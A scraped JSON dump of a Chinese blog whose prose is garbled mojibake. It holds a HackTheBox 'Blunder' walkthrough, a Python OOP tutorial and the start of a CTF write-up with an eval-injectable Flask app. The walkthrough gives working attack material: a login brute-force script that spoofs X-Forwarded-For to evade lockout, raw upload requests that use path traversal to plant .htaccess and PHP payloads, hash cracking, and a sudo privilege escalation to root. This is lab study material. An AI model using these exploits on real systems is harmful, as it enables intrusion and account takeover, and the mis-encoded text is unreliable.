3.9.2ç‰ˆæœ¬ä¸­çš„ bl-kernel/security.class.php ä¸€äº›ä»£ç å°†æ£€æŸ¥ä¸»æœºè¿›è¡Œçš„é”™è¯¯ç™»å½•å°è¯•æ¬¡æ•°ã€‚å¦‚æœä¸»æœºè¿›è¡Œ10æ¬¡ä¸æ­£ç¡®çš„å°è¯•ï¼Œåˆ™ä¼šæš‚æ—¶é˜»æ­¢å®ƒä»¬ï¼Œä»¥å‡è½»æš´åŠ›ç ´è§£çš„ä¼å›¾ã€‚æ”»å‡»è€…é€šè¿‡ä½¿ç”¨å¤šä¸ªä¼ªé€ çš„X-Forwarded-Foræˆ–Client-IP HTTPæ ‡å¤´åˆ©ç”¨è¯¥æ¼æ´ç»•è¿‡ä¿æŠ¤æœºåˆ¶ã€‚\nçˆ†ç ´äº†åŠå¤©ï¼Œæ— æœã€‚\nçœ‹äº†wpä¹‹åï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†æœ¬æ¥æ²¡æœ‰è¢«dirsearchæ‰«åˆ°çš„/todo.txtï¼š\n-Update the CMS\r-Turn off FTP - DONE\r-Remove old users - DONE\r-Inform fergus that the new blog needs images - PENDING\rå¯ä»¥çŒœåˆ°ç”¨æˆ·åå¯èƒ½æ˜¯ fergus ï¼Œä½†æ˜¯å¯†ç éœ€è¦ç”¨åˆ°cewlæ¥ç”Ÿæˆå¼±å£ä»¤å­—å…¸\ncewl -w wordlist.txt -d 10 -m 1 http://10.10.10.191/\rç„¶åæˆ‘ä»¬åˆ©ç”¨æ”¹è£…è¿‡åçš„CVE-2019-17240çš„pocæ¥æ‰“ï¼š\n#!/usr/bin/env python3\rimport re\rimport requests\rdef open_ressources(file_path):\rreturn [item.replace(\u0026quot;\\n\u0026quot;, \u0026quot;\u0026quot;) for item in open(file_path).readlines()]\rhost = 'http://10.10.10.191'\rlogin_url = host + '/admin/login'\rusername = 'fergus'\rwordlist = open_ressources('wordlist.txt')\rfor password in wordlist:\rsession = requests.Session()\rlogin_page = session.get(login_url)\rcsrf_token = re.search('input.+?name=\u0026quot;tokenCSRF\u0026quot;.+?value=\u0026quot;(.+?)\u0026quot;', login_page.text).group(1)\rprint('[*] Trying: {p}'.format(p = password))\rheaders = {\r'X-Forwarded-For': password,\r'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',\r'Referer': login_url\r}\rdata = {\r'tokenCSRF': csrf_token,\r'username': username,\r'password': password,\r'save': ''\r}\rlogin_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)\rif 'location' in login_result.headers:\rif '/admin/dashboard' in login_result.headers['location']:\rprint()\rprint('SUCCESS: Password found!')\rprint('Use {u}:{p} to login.'.format(u = username, p = password))\rprint()\rbreak\ræœ€ååœ¨ç¬¬ä¸€ç™¾å¤šä½çˆ†ç ´å‡ºç”¨æˆ·åferguså¯†ç RolandDeschain\nè¿›å…¥åå°ã€‚\nCVE-2019-16113 æ–‡ç« è¯´çš„å¾ˆè¯¦ç»†ï¼Œé€šè¿‡æ›´æ”¹uuidçš„å€¼æ¥æŒ‡å®šä¸Šä¼ æ–‡ä»¶çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯ç›®å½•ç©¿è¶Š\nç„¶åä¸ç¬¦åˆå›¾ç‰‡åç¼€çš„æ–‡ä»¶ä¼šå…ˆè¢«ç§»åŠ¨åˆ°/bl-content/tmp/temp/ç›®å½•ä¸‹ï¼Œç„¶åè¿›è¡Œåˆ é™¤ï¼Œæˆ‘ä»¬åˆ©ç”¨intruderè¿›è¡Œæ¡ä»¶ç«äº‰\nä¸Šä¼ .htaccessæ–‡ä»¶ï¼ŒæŠŠjpgè§£æä¸ºphpï¼š\nPOST /admin/ajax/upload-images HTTP/1.1\rHost: 10.10.10.191\rUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\rAccept: */*\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rReferer: http://10.10.10.Â§191Â§/admin/edit-content/blender\rX-Requested-With: XMLHttpRequest\rContent-Type: multipart/form-data; boundary=---------------------------1197595220477940257964308486\rContent-Length: 560\rConnection: close\rCookie: BLUDIT-KEY=k35lg8hngofh6kvif51i37m0o5\r-----------------------------1197595220477940257964308486\rContent-Disposition: form-data; name=\u0026quot;images[]\u0026quot;; filename=\u0026quot;.htaccess\u0026quot;\rContent-Type: image/jpeg\rRewriteEngine off\rAddType application/x-httpd-php jpg\r-----------------------------1197595220477940257964308486\rContent-Disposition: form-data; name=\u0026quot;uuid\u0026quot;\r21b8a0e80e433cb7453e7d72382c6bc1\r-----------------------------1197595220477940257964308486\rContent-Disposition: form-data; name=\u0026quot;tokenCSRF\u0026quot;\rc623c868d292dec9b4e11c104f54c9e3dde971ee\r-----------------------------1197595220477940257964308486--\rä¸Šä¼ æ¶æ„wh1sper.jpgåˆ°/bl-content/tmp/temp/ç›®å½•ï¼š\nPOST /admin/ajax/upload-images HTTP/1.1\rHost: 10.10.10.191\rUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\rAccept: */*\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rReferer: http://10.10.10.Â§191Â§/admin/edit-content/blender\rX-Requested-With: XMLHttpRequest\rContent-Type: multipart/form-data; boundary=---------------------------1197595220477940257964308486\rContent-Length: 589\rConnection: close\rCookie: BLUDIT-KEY=k35lg8hngofh6kvif51i37m0o5\r-----------------------------1197595220477940257964308486\rContent-Disposition: form-data; name=\u0026quot;images[]\u0026quot;; filename=\u0026quot;wh1sper.jpg\u0026quot;\rContent-Type: image/jpeg\r\u0026lt;?php file_put_contetns(\u0026quot;../wh1sper.php\u0026quot;,\u0026quot;\u0026lt;?php phpinfo();?\u0026gt;\u0026quot;);?\u0026gt;\r-----------------------------1197595220477940257964308486\rContent-Disposition: form-data; name=\u0026quot;uuid\u0026quot;\r21b8a0e80e433cb7453e7d72382c6bc1/../../../tmp/temp\r-----------------------------1197595220477940257964308486\rContent-Disposition: form-data; name=\u0026quot;tokenCSRF\u0026quot;\rc623c868d292dec9b4e11c104f54c9e3dde971ee\r-----------------------------1197595220477940257964308486--\rè·å¾—shellï¼š\næ‹¿åˆ°äº†shellä¹‹åæ ¹ç›®å½•å¹¶æ²¡æœ‰æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿ï¼Œæˆ‘ä»¬è¿™ä¸ªè´¦æˆ·å¹¶æ²¡æœ‰æƒé™æŸ¥çœ‹/rootç›®å½•ï¼›\næˆ‘ä»¬å¯ä»¥åœ¨wwwç›®å½•ä¸‹çœ‹åˆ°å¦å¤–ä¸€ä¸ªç‰ˆæœ¬çš„bluditï¼Œå¹¶ä¸”å†user.phpé‡Œé¢å¯ä»¥æ‰¾åˆ°å¦å¤–ä¸€ä¸ªè´¦æˆ·çš„è´¦å·å¯†ç \nåˆ©ç”¨kaliè‡ªå¸¦çš„ hash-identifier è¿›è¡Œè¯†åˆ«ï¼š\nroot@wh1sper:~# hash-identifier\r#########################################################################\r# __ __ __ ______ _____ #\r# /\\ \\/\\ \\ /\\ \\ /\\__ _\\ /\\ _ `\\ #\r# \\ \\ \\_\\ \\ __ ____ \\ \\ \\___ \\/_/\\ \\/ \\ \\ \\/\\ \\ #\r# \\ \\ _ \\ /'__`\\ / ,__\\ \\ \\ _ `\\ \\ \\ \\ \\ \\ \\ \\ \\ #\r# \\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\ \\_\\ \\__ \\ \\ \\_\\ \\ #\r# \\ \\_\\ \\_\\ \\___ \\_\\/\\____/ \\ \\_\\ \\_\\ /\\_____\\ \\ \\____/ #\r# \\/_/\\/_/\\/__/\\/_/\\/___/ \\/_/\\/_/ \\/_____/ \\/___/ v1.2 #\r# By Zion3R #\r# www.Blackploit.com #\r# Root@Blackploit.com #\r#########################################################################\r--------------------------------------------------\rHASH: faca404fd5c0a31cf1897b823c695c85cffeb98d\rPossible Hashs:\r[+] SHA-1\r[+] MySQL5 - SHA-1(SHA-1($pass))\rhttps://md5decrypt.net/en/Sha1/è§£ç å¾—åˆ°:Password120\nå†°èç»ˆç«¯ï¼š\nsu hugo\rPassword120\ræˆ‘ä»¬åˆ‡æ¢åˆ°äº†hugoç”¨æˆ·ï¼Œä½†æ˜¯è¿˜æ˜¯æ²¡æœ‰rootæƒé™\nhugo@blunder:/var/www/bludit-3.9.2$ sudo -l\rPassword: Password120\rMatching Defaults entries for hugo on blunder:\renv_reset, mail_badpass,\rsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\rUser hugo may run the following commands on blunder:\r(ALL, !root) /bin/bash\rCVE-2019-14287 Google (ALL, !root) /bin/bash ä¹‹åå¯ä»¥ç”¨è¿™ç§æ–¹å¼ææƒï¼š\nhugo@blunder:/var/www/bludit-3.9.2$ sudo -u#-1 /bin/bash\rroot@blunder:/var/www/bludit-3.9.2# cat /root/root.txt\rb1466707cf5be5f66b8be2c4a525e066\rroot@blunder:/var/www/bludit-3.9.2#\rå°±å¯ä»¥å¾—åˆ°root.txtäº†ï¼Œå¦å¤–homeç›®å½•ä¸‹è¿˜æœ‰ä¸ªuser.txt\n","date":"2020-07-16T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180606.png","permalink":"https://anthem-whisper.github.io/p/hacktheboxblunder/","title":"HackTheBox::Blunder"},{"content":"è¯´äº†æš‘å‡å­¦å¼€å‘ï¼Œç»å¯¹ä¸å’•å’•å’•ï¼ˆ0%ï¼‰\n é¢å‘è¿‡ç¨‹ å‡å¦‚ä½ æ‹¥æœ‰äº†ä¸€ä¸ªåšé¥­æ´—ç¢—çš„ä»»åŠ¡ï¼Œä½ å‡†å¤‡ç”¨é¢å‘è¿‡ç¨‹çš„æ€æƒ³æ¥è§£å†³å®ƒ\nå¯ä»¥çœ‹åˆ°è¿‡ç¨‹éå¸¸çš„ç¹çï¼Œä½ å°†é¢å¯¹æ‰€æœ‰çš„æ­¥éª¤\n é¢å‘å¯¹è±¡ å‡å¦‚ä½ ç°åœ¨æœ‰ä¸ªå¯¹è±¡ï¼Œå¥¹æ‹¥æœ‰ä¸¤ä¸ªæŠ€èƒ½ï¼š\n1.åšé¥­ 2.æ´—ç¢—\né‚£ä¹ˆä½ åªéœ€è¦é¢å‘ä½ çš„å¯¹è±¡ï¼Œç„¶åä½ çš„å¯¹è±¡å»å¤„ç†å…¶ä»–æ‰€æœ‰è¿‡ç¨‹\né‚£å¦‚æœä½ çš„å¯¹è±¡å†æ‹¥æœ‰ä¸¤ä¸ªå¯¹è±¡ï¼š\n1.ç‚’èœæœº 2.æ´—ç¢—æœº\né‚£ä¹ˆå¥¹åªéœ€è¦æ¯æ¬¡éƒ½åšä¸‰ä¸ªåŠ¨ä½œï¼Œä¸å¿…ä¸€æ¬¡é¢å‘æ‰€æœ‰æ­¥éª¤\n å¾ˆå¦™ï¼å¯¹ä¸å¯¹ï¼Ÿ\nä½ åªéœ€è¦å¯¹ä½ çš„å¯¹è±¡è¯´éœ€è¦åšä»€ä¹ˆï¼Œç„¶åä½ çš„å¯¹è±¡å°±ä¼šå¸®ä½ åšå¥½æ‰€æœ‰çš„äº‹æƒ…ï¼Œä½ æ—¢çœ‹ä¸åˆ°å…·ä½“çš„è¿‡ç¨‹ï¼Œä½ ä¹Ÿä¸éœ€è¦çŸ¥é“å…·ä½“çš„è¿‡ç¨‹\nä½ çš„å¯¹è±¡ä¹Ÿä¸éœ€è¦çŸ¥é“å…·ä½“çš„ç‚’èœæˆ–è€…æ´—ç¢—çš„æ­¥éª¤ï¼Œå¥¹åªéœ€å¯¹æ´—ç¢—æœºæˆ–è€…ç‚’èœæœºè¯´éœ€è¦åšä»€ä¹ˆï¼Œæ´—ç¢—æœºæˆ–è€…ç‚’èœæœºå°±ä¼šå¸®å¥¹åšå®Œæ‰€æœ‰çš„æ­¥éª¤\nè¿™ä¸ªå°±å«åšå°è£…ã€‚\næŠŠæ…æ‹Œã€ç¿»ç‚’ã€ç›‘æµ‹ç«å€™å°è£…æˆè‡ªåŠ¨ç‚’èœæœº æŠŠå€’æ´—æ´ç²¾ã€åˆ·ç¢—ã€æ“¦å¹²æ°´å°è£…æˆè‡ªåŠ¨æ´—ç¢—æœº å†æŠŠå‰©ä¸‹çš„å°è£…æˆä½ çš„å¥³æœ‹å‹\n ä¸¤è€…çš„å¯¹æ¯”  é¢å‘å¯¹è±¡æœ¬èº«æ˜¯å¯¹é¢å‘è¿‡ç¨‹çš„å°è£… é¢å‘è¿‡ç¨‹ä»€ä¹ˆæœ€é‡è¦ï¼Ÿ  æŒ‰æ­¥éª¤åˆ’åˆ† æŠŠæ¯ä¸ªä»»åŠ¡ï¼Œåˆ†è§£æˆå…·ä½“çš„æ¯ä¸ªæ­¥éª¤   é¢å‘å¯¹è±¡ä»€ä¹ˆæœ€é‡è¦ï¼Ÿ  æŒ‰åŠŸèƒ½å°±è¡Œåˆ’åˆ† æ‰¾åˆ°å¯¹è±¡ï¼Œç¡®å®šå¯¹è±¡çš„å±æ€§ã€è¡Œä¸º   å¦‚ä½•ä»é¢å‘è¿‡ç¨‹æ€æƒ³è½¬åŒ–ä¸ºé¢å‘å¯¹è±¡æ€æƒ³ï¼Ÿ  å’Œé¢å‘è¿‡ç¨‹ä¸€æ ·ï¼Œå…ˆæ‰¾åˆ°æ‰€æœ‰æ­¥éª¤ è¯•å›¾åˆ†ç¦»åŠŸèƒ½ä»£ç å— å°†è¿™äº›åŠŸèƒ½ä»£ç å—ï¼Œåˆ’åˆ†åˆ°æŸå¯¹è±¡ä¸­ æ ¹æ®å¯¹è±¡è¡Œä¸ºï¼ŒæŠ½è±¡å‡º â€œç±»â€   å¯¹è±¡å’Œç±»çš„å…³ç³»  å¯¹è±¡-\u0026gt;æŠ½è±¡-\u0026gt;ç±»-\u0026gt;å®ä¾‹åŒ–-\u0026gt;å¯¹è±¡     å¯¹è±¡å’Œç±» å¯¹è±¡å’Œç±»é‡Œé¢æœ‰ä¸¤ä¸ªä¸œè¥¿ï¼š\n å±æ€§ æ–¹æ³•  å±æ€§æ˜¯é™æ€çš„ã€ç”¨æ¥æè¿°è¿™ä¸ªç±»æˆ–è€…å¯¹è±¡æœ¬èº«çš„å˜é‡\næ¯”å¦‚ï¼Œå¼ ä¸‰è¿™ä¸ªå¯¹è±¡ï¼Œä»–çš„å±æ€§æœ‰å¹´é¾„ã€æ€§åˆ«ã€èº«é«˜ã€ä½“é‡ äººè¿™ä¸ªç±»å±æ€§ä¹Ÿæœ‰å¹´é¾„ã€æ€§åˆ«ã€èº«é«˜ã€ä½“é‡\nå¼ ä¸‰èƒ½æ‰§è¡Œåƒé¥­è¿™ä¸ªåŠ¨ä½œï¼Œè¿™å°±æ˜¯ä»–çš„ä¸€ä¸ªæ–¹æ³•\nç°åœ¨æˆ‘ä»¬æ¥æ–°å»ºä¸€ä¸ªç±»ï¼ŒæŠŠä»–å®ä¾‹åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡å¹¶ä¸”ç»™ä»–ä¸€äº›å±æ€§ï¼š\n# python3\rclass Person:\rpass\rzhangsan = Person()#å®ä¾‹åŒ–ä¸ºå¯¹è±¡\rzhangsan.age = 19#ç»™zhangsanå¯¹è±¡æ·»åŠ ä¸€ä¸ªå±æ€§ageå¹¶ä¸”èµ‹å€¼ä¸º19\rzhangsan.height = 190#ç»™zhangsanå¯¹è±¡æ·»åŠ ä¸€ä¸ªå±æ€§heightå¹¶ä¸”èµ‹å€¼ä¸º190\rprint(zhangsan.age)#æµ‹è¯•èƒ½å¦è®¿é—®è¿™ä¸ªå±æ€§\rprint(zhangsan.__dict__)#è¾“å‡ºzhangsanæ‰€æœ‰å±æ€§\rprint(zhangsan.__class__)#è¾“å‡ºzhangsançš„ç±»\rprint(zhangsan.__class__.__name__)#è¾“å‡ºzhangsançš„ç±»çš„åç§°\rè¿è¡Œè¾“å‡ºï¼š\r19\r{'age': 19, 'height': 190}\r\u0026lt;class '__main__.Person'\u0026gt;\rPerson\rä¸‹é¢æ˜¯è¿™æ®µç¨‹åºåœ¨å†…å­˜ä¸­çš„çŠ¶æ€ï¼š\nå…¶å®åœ¨pythonä¸­ï¼Œä¸‡ç‰©çš†ä¸ºå¯¹è±¡ï¼ŒåŒ…æ‹¬intï¼Œfloatï¼Œstrè¿™äº›æ•°æ®ç±»å‹ä¹Ÿéƒ½æ¥è‡ªå¯¹è±¡ã€‚\næ¯”å¦‚ï¼šåœ¨pythonçš„å‘½ä»¤è¡Œé‡Œé¢æ‰§è¡Œï¼š\nPython 3.8.1 (tags/v3.8.1:1b293b6, Dec 18 2019, 23:11:46) [MSC v.1916 64 bit (AMD64)] on win32\rType \u0026quot;help\u0026quot;, \u0026quot;copyright\u0026quot;, \u0026quot;credits\u0026quot; or \u0026quot;license\u0026quot; for more information.\r\u0026gt;\u0026gt;\u0026gt; ''.__class__\r\u0026lt;class 'str'\u0026gt;\r\u0026gt;\u0026gt;\u0026gt; ''.__class__.__class__\r\u0026lt;class 'type'\u0026gt;\r\u0026gt;\u0026gt;\u0026gt;\ræˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œstrç±»å‹å…¶å®æ˜¯æ¥è‡ªä¸€ä¸ªå«åšstrçš„ç±»ï¼Œç„¶åè¿™ä¸ªstrçš„ç±»æ¥è‡ªtypeå¯¹è±¡ã€‚å®é™…ä¸Šè¿™ä¸ªclass 'str'ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªç±»çš„æ—¶å€™ï¼Œè¿™ä¸ªç±»æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ã€‚\nä¸ºäº†æ–¹ä¾¿åŒºåˆ«ï¼Œæˆ‘ä»¬ä¹ŸæŠŠæˆ‘ä»¬è‡ªå·±å®šä¹‰çš„é‚£ä¸ªç±»å«åšâ€œç±»â€ï¼ŒæŠŠä»–å®ä¾‹åŒ–å¾—åˆ°çš„å¯¹è±¡ç§°ä½œâ€œå®ä¾‹â€\n å±æ€§å’Œæ–¹æ³• å±æ€§ 1.å±æ€§åˆ†ä¸ºç±»å±æ€§å’Œå®ä¾‹å±æ€§ã€‚\nä¸‹é¢æˆ‘ä»¬æ¥æ“ä½œä¸€ä¸‹ï¼š\n#python3\rclass Person:\rage = 18\rzhangsan = Person()\rzhangsan.sex = 'man'\rprint(zhangsan.sex)\rprint(Person.age)\rè¿è¡Œå¾—åˆ°ï¼š\rman\r18\rå¯è§ï¼Œæˆ‘ä»¬æ˜¯å¯ä»¥é€šè¿‡ç±»å.å±æ€§åæ¥è®¿é—®ä¸€ä¸ªç±»å±æ€§ï¼Œå‰é¢æˆ‘ä»¬è¯´è¿‡ï¼Œè¿™ä¸ªPersonç±»å…¶å®ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ŒPersonè¿™ä¸ªå˜é‡æŒ‡å‘äº†è¿™ä¸ªç±»ï¼ˆå¯¹è±¡ï¼‰å­˜æ”¾çš„å†…å­˜åœ°å€ï¼Œå½“ç„¶ä¹Ÿå°±å¯ä»¥Person.ageè®¿é—®ä¸€ä¸ªç±»å±æ€§\n2.ç±»å±æ€§ä¸ºæ‰€æœ‰å®ä¾‹å…±äº«\næ˜¾è€Œæ˜“è§ï¼Œä½†ä½ ä¿®æ”¹æˆ–è€…å®šä¹‰äº†Personç±»çš„ä¸€ä¸ªå±æ€§ï¼Œæ¯”å¦‚ageï¼Œé‚£ä¹ˆè¿™ä¸ªç±»çš„æ‰€æœ‰å®ä¾‹éƒ½å¯ä»¥æ‹¥æœ‰è¿™ä¸ªå±æ€§ï¼›\nå½“ä½ è®¿é—®ä¸€ä¸ªå®ä¾‹çš„å±æ€§æ—¶ï¼Œå…·ä½“æ­¥éª¤ä¸ºï¼š\n åœ¨å½“å‰å®ä¾‹é‡Œé¢ï¼ˆdictï¼‰æŸ¥æ‰¾è¿™ä¸ªå±æ€§ å¦‚æœæ²¡æœ‰ï¼Œåˆ™åœ¨ä¸Šçº§æŸ¥æ‰¾è¿™ä¸ªå±æ€§ï¼ˆ.class.dictï¼‰ å¦‚æ­¤åå¤ï¼Œç›´åˆ°åŸºç±»ï¼Œæ²¡æœ‰åˆ™æŠ¥é”™  3.ç±»å±æ€§å’Œå®ä¾‹å±æ€§çš„å¢åˆ æ”¹æŸ¥\nå¢æ·»ï¼š\n å®ä¾‹å.å±æ€§å=xxx å®ä¾‹å.class.å±æ€§å=xxx ç±»å.å±æ€§å=xxx å¯ä»¥é€šè¿‡åœ¨ç±»é‡Œé¢å®šä¹‰ä¸€ä¸ª ç±»å.__slots__={\u0026quot;aaa\u0026quot;} æ¥é™åˆ¶æ­¤ç±»çš„å®ä¾‹åªèƒ½æ·»åŠ aaaå±æ€§  åˆ é™¤ï¼š\n del å®ä¾‹å.å±æ€§å del ç±»å.å±æ€§å åªèƒ½åˆ å½“å‰ç±»ï¼Œä¸èƒ½å‘ä¸Šä¸€çº§åˆ é™¤  æ–¹æ³• åŒç†ï¼Œåˆ†ä¸ºå®ä¾‹æ–¹æ³•ã€ç±»æ–¹æ³•å’Œé™æ€æ–¹æ³•\n1.æ–¹æ³•å£°æ˜å’Œå‚¨å­˜éƒ½åœ¨ç±»å¯¹è±¡é‡Œé¢\nä¸ç®¡æ˜¯ç±»æ–¹æ³•è¿˜æ˜¯å®ä¾‹æ–¹æ³•ï¼Œéƒ½å¿…é¡»åœ¨ç±»é‡Œé¢è¿›è¡Œå£°æ˜ï¼Œç„¶åæ–¹æ³•åç§°å‚¨å­˜åœ¨ç±»é‡Œé¢ï¼ŒæŒ‡å‘è¿™ä¸ªæ–¹æ³•æœ¬èº«çš„å†…å­˜åœ°å€\n2.å®ä¾‹æ–¹æ³•æ¥å—çš„ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯ä¸€ä¸ªå®ä¾‹ï¼Œä½†æ˜¯é€šè¿‡å®ä¾‹è°ƒç”¨çš„æ—¶å€™ä¸å¿…å¡«å†™ç¬¬ä¸€ä¸ªå‚æ•°\næˆ‘ä»¬åœ¨åˆ›å»ºä¸€ä¸ªå®ä¾‹æ–¹æ³•çš„æ—¶å€™ç¼–è¾‘å™¨è‡ªåŠ¨ç»™æˆ‘ä»¬è¡¥å…¨äº†ç¬¬ä¸€ä¸ªå‚æ•°self\nè¿™é‡Œä¸ªselfåªæ˜¯ä¸€ä¸ªå½¢å¼å‚æ•°ï¼Œå¯ä»¥å†™æˆå…¶ä»–åå­—ï¼Œä¸è¿‡selfæ›´å¥½\n3.ç±»æ–¹æ³•æ¥å—çš„ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯ä¸€ä¸ªç±»å¯¹è±¡ï¼Œä½†æ˜¯é€šè¿‡å®ä¾‹è°ƒç”¨æ—¶å€™ä¸å¿…å¡«å†™ç¬¬ä¸€ä¸ªå‚æ•°\nå¦‚ä¸ŠåŒç†ï¼Œå½¢å¼å‚æ•°ä¸ºclsï¼Œä¸è¿‡åœ¨å£°æ˜çš„æ—¶å€™éœ€è¦åœ¨æ–¹æ³•å‰é¢åŠ ä¸Š@classmethodè£…é¥°å™¨\n4.é™æ€æ–¹æ³•æ²¡æœ‰å¿…é¡»æ¥å—çš„å‚æ•°\nå®šä¹‰é™æ€æ–¹æ³•çš„æ—¶å€™éœ€è¦åœ¨ä¸Šä¸€è¡ŒåŠ å…¥è£…é¥°å™¨@staticmethod\n5.å®ä¾‹æ–¹æ³•çš„å‡ ç§è°ƒç”¨æ–¹å¼\n é€šè¿‡å®ä¾‹è°ƒç”¨æ–¹æ³•  è°ƒç”¨çš„æ—¶å€™ä¸å¿…æˆ‘ä»¬ä¼ å…¥ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œpythonè‡ªåŠ¨æŠŠpå¯¹è±¡ä¼ ç»™äº†ç¬¬ä¸€ä¸ªå‚æ•°\n é€šè¿‡ç±»è°ƒç”¨  æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨ä¼ é€’ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¸ç„¶å°±ä¼šæŠ¥é”™ï¼Œæœ¬è´¨ä¸Šæ˜¯ç›´æ¥æ‰¾åˆ°å†…å­˜ä¸­è¿™ä¸ªæ–¹æ³•çš„åœ°å€è¿›è¡Œè°ƒç”¨\n6.ç±»æ–¹æ³•æˆ–è€…å®ä¾‹æ–¹æ³•ï¼Œéƒ½å¯ä»¥é€šè¿‡å®ä¾‹æˆ–è€…ç±»è°ƒç”¨è€Œä¸å¿…æ‰‹åŠ¨ä¼ å…¥ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè€Œç›´æ¥è°ƒç”¨çš„æ—¶å€™éœ€è¦æ‰‹åŠ¨ä¼ å…¥ç¬¬ä¸€ä¸ªå‚æ•°\næ¯”å¦‚æˆ‘ä»¬ä¸‹é¢ä¸€æ®µä»£ç ï¼š\n#python3\raaa = 'a,aa,aaa'\ra = aaa.split(',')#splitæ˜¯class strçš„é‡Œé¢çš„ä¸€ä¸ªå®ä¾‹æ–¹æ³•ï¼Œç›¸å½“äºæˆ‘ä»¬ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯aaaè¿™ä¸ªå®ä¾‹\rprint(a)\r å±æ€§çš„è®¿é—®æƒé™ pythonä¸åƒå…¶ä»–è¯­è¨€å¯ä»¥é€šè¿‡privateã€protectè¿™äº›å…³é”®è¯æ¥ä¿®é¥°å±æ€§ï¼Œpythonåªèƒ½é€šè¿‡åœ¨å±æ€§åç§°å‰é¢æ·»åŠ ä¸€ä¸ªæˆ–è€…ä¸¤ä¸ªä¸‹åˆ’çº¿æ¥å£°æ˜ä¸€ä¸ªä¼ªç§æœ‰çš„å±æ€§ã€‚\nä¸è¯´äº†ï¼Œå¼€å±€ä¸€å¼ å›¾ï¼š\nå•ä¸‹åˆ’çº¿å¼€å¤´å˜é‡ï¼š\nåŒä¸‹åˆ’çº¿å¼€å¤´å˜é‡ï¼š\næ„Ÿå¹å·è¡¨ç¤ºä¼šå‘å‡ºè­¦å‘Šï¼ŒÃ—è¡¨ç¤ºä¸èƒ½è®¿é—®\nä½†æ˜¯æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥é€šè¿‡ _ç±»å__å±æ€§å æ¥è®¿é—®è¿™ä¸ªå±æ€§ï¼š\n","date":"2020-07-09T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228095632.jpeg","permalink":"https://anthem-whisper.github.io/p/python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/","title":"pythoné¢å‘å¯¹è±¡åŸºç¡€å­¦ä¹ "},{"content":"å› ä¸ºå’Œç¬¬äº”ç©ºé—´è¿ç€ï¼Œç„¶åæ˜¨å¤©ä¸‹åˆåˆå»æ‰“äº†ä¸€åœºAWDï¼Œæ„Ÿè§‰èº«ä½“æç©ºï¼Œå°±è®¤çœŸæ‰“äº†DASCTFï¼ˆå’•å’•å’•ï¼‰ï¼Œå‰©ä¸‹çš„é¢˜ç›®ç­‰æœ‰æœºä¼šå†å¤ç°\n ç®€å•çš„è®¡ç®—å™¨-1 è€ƒç‚¹ï¼špython eval()ä»£ç æ³¨å…¥ï¼Œå‘½ä»¤æ‰§è¡Œç»“æœå¤–å¸¦\nè®¿é—®Sourceå¯ä»¥çœ‹åˆ°æºç ï¼š\n#!/usr/bin/env python3\r# -*- coding: utf-8 -*-\rfrom flask import Flask, render_template, request,session\rfrom config import black_list,create\rimport os\rapp = Flask(__name__)\rapp.config['SECRET_KEY'] = os.urandom(24)\r## flag is in /flag try to get it\r@app.route('/', methods=['GET', 'POST'])\rdef index():\rdef filter(string):#è¿™é‡Œæ˜¯ä¸‹åˆæš—æ”¹è¿‡çš„ï¼Œæœ¬æ¥åªè¿‡æ»¤äº†or\rfor black_word in black_list:\rif black_word in string:\rreturn \u0026quot;hack\u0026quot;\rreturn string\rif request.method == 'POST':\rinput = request.form['input']\rcreate_question = create()\rinput_question = session.get('question')\rsession['question'] = create_question\rif input_question==None:\rreturn render_template('index.html', answer=\u0026quot;Invalid session please try again!\u0026quot;, question=create_question)\rif filter(input)==\u0026quot;hack\u0026quot;:\rreturn render_template('index.html', answer=\u0026quot;hack\u0026quot;, question=create_question)\rtry:\rcalc_result = str((eval(input_question + \u0026quot;=\u0026quot; + str(input))))\rif calc_result == 'True':\rresult = \u0026quot;Congratulations\u0026quot;\relif calc_result == 'False':\rresult = \u0026quot;Error\u0026quot;\relse:\rresult = \u0026quot;Invalid\u0026quot;\rexcept:\rresult = \u0026quot;Invalid\u0026quot;\rreturn render_template('index.html', answer=result,question=create_question)\rif request.method == 'GET':\rcreate_question = create()\rsession['question'] = create_question\rreturn render_template('index.html',question=create_question)\r@app.route('/source')\rdef source():\rreturn open(\u0026quot;app.py\u0026quot;, \u0026quot;r\u0026quot;).read()\rif __name__ == '__main__':\rapp.run(host=\u0026quot;0.0.0.0\u0026quot;, 